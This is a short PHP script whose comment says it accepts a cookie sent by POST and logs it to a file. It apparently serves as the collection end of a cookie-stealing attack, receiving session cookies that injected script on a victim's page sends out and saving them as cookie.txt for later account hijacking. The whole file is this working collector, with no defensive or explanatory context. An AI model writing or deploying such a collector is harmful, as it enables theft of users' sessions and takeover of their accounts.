<!-- Accept a post request with a cookie, accept the request and log the cookie to a file -->

<?php
$cookie = $_POST['cookie'];
$myfile = fopen("cookie.txt", "w") or die("Unable to open file!");
fwrite($myfile, $cookie);
fclose($myfile);
?>